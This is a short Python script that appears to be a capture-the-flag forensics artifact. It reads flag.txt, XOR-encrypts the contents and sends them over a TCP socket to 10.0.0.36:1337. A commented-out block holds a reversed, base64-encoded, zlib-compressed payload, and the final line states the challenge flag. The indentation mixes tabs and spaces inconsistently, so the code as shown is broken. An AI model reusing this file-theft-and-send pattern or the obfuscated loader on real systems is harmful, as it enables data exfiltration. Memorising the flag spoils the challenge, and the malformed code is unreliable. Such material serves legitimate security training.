#from base64 import b64decode
#from zlib import decompress



#a = b'=Ab60gyJjbfV7OrLdpHv9kS7q0HO//33+4mCiP/tW+yu8WA5Yt05uxCEBhR+DGorJ+3JjigOd32OczxI/I66yOaLTDyHrIH+PZo841pJgX8eyhCsaQK2NhZbXPgYVq6R/eQ+y2ysytf6k3NX4vdZdzlo5frxLiPZQqhtYhErX1N6xgTcOMReOVn1dEMrastRk+7+j4p3NjZunugzxumVGYY+JG2kr/dpWTrOEsHVDKNAAK0bmtXim+SCsY7bTG3Wa3KRLagutNpee9lPYKWvfL5K9zHPJcZik1n3MM2ZbRDPGOsEVotHiEaFlWmqvj+Z9kWA40lmQYMFPLkS6SxTzm1HF6g2odE6GfYu6g2aocxc2VU/G5Ekp5pD4/7cIrOqP6BRS/b2H0W5axAeaTzJJOK7MmmQ6xeNNrXXjh43gnAXfCrHYUpclM3magoXTBeHt8UCkULBPmelUZAkVsaUVdiFAgYSBou6AbI14t/S7s7M7EDYz/y0wtT3v3fVE0tbrvDkTL2w6gSfWNKswm2qdQIXeIVKa52RikIYPIRsf9LfQA0mv1lUtxJe'
#a = a[::-1]
#a = b64decode(a)
#a = decompress(a)

#print(a) 

import socket

# Function to encrypt data with XOR
def encrypt(data, key):
    encrypted_data = bytearray()
    for byte in data:
    	    encrypted_data.append(byte ^ key)
    return encrypted_data

# Read flag from file
with open('flag.txt', 'rb') as file:
	flag_content = file.read()

	# Encrypt flag content
	encrypted_flag = encrypt(flag_content, 0x55)

    # TCP settings
    HOST = '10.0.0.36'  # Change this to your server IP
    PORT = 1337        # Change this to your desired port

    # Create socket object
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

    # Connect to server
    s.connect((HOST, PORT))

    # Send encrypted flag
	s.sendall(encrypted_flag)

# Close the connection
s.close()
###FLAG FOR BURGLAR: HZU{W0w_suCh-4_GENIE}